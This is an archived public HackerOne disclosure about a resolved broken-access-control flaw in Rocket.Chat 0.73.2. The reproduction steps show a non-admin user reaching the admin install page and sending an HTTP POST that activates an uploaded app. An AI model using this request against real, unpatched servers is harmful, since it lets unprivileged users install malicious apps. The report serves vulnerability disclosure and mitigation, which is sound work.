---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-access-control-generic
  - env/web
  - vuln/broken-access-control
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2019-06-22
submitted: 2019-02-06T11:51:30.342Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "theappsec"
source: "https://hackerone.com/reports/491892"
title: "Broken access control on apps "
---
# Broken access control on apps 

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 9 | **Program:** Rocket.Chat | **Disclosed:** 2019-06-22

- Report: [https://hackerone.com/reports/491892](https://hackerone.com/reports/491892)
- CWE: Improper Access Control - Generic
- Submitted: 2019-02-06T11:51:30.342Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 

The user without administrative privileges can upload and install any Application into the rocket.chat
As ID of application is controlled in the app.json file (which is controlled by uploader) user can also activate the app.

## Releases Affected:

  * 0.73.2

## Steps To Reproduce:
- User log-in into the chat
- User open the following link:

```
http://<rocket-chat.link>>/admin/app/install
```
- Upload any app
- Activate it by send the following POST request to the installed app:

```http
POST /api/apps/<ID_of_the_installed_App>/status HTTP/1.1
Host: rocket-chat.link
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-User-Id: [redacted]
X-Auth-Token: [redacted]
X-Requested-With: XMLHttpRequest
Cookie: [redacted]
DNT: 1
Connection: close
Content-Length: 29

{"status":"manually_enabled"}
```

## Supporting Material/References:

You can see the uploading process in the attached video. Left user is admin, right -  user without any additional privileges. 

## Suggested mitigation
Managing apps should be available to admins only.

## Impact

Users can install and activate malicious apps into the rocket.chat.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **2019-06-19** @rodrigok: @theappsec I think so
- **Report Became Public**
